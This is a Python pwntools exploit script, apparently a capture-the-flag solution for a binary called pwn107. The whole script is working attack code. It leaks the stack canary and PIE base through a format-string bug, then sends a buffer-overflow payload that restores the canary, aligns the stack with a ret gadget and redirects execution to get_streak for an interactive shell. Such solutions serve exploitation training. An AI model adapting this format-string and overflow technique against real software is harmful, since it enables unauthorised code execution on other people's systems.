from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
piebase
continue
'''.format(**locals())

# Binary filename
exe = './pwn107.pwn107'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Leak stack canary address & pie address
stack_leak = '%13$p'
pie_leak = '%17$p'
io.sendlineafter(b':', stack_leak.encode() + b' ' + pie_leak.encode())
io.recvuntil(b'Your current streak: ')

# Extract the two addresses from the response
leak = io.recvline().decode().strip().split(' ')
canary = int(leak[0], 16)
leakedpie = int(leak[1], 16)
info("Canary address: %#x", canary)
info("Leaked Pie address: %#x", leakedpie)

# Calculate pie base address
elf.address = leakedpie - 0x992
info("Piebase address: %#x", elf.address)

offset = 24
ret = 0x06fe #  ret;
movaps = elf.address + ret

payload = flat([
    offset * b'A',
    canary,
    b'B' * 8,
    movaps,
    elf.symbols.get_streak
])

io.sendline(payload)

# Got Shell?
io.interactive()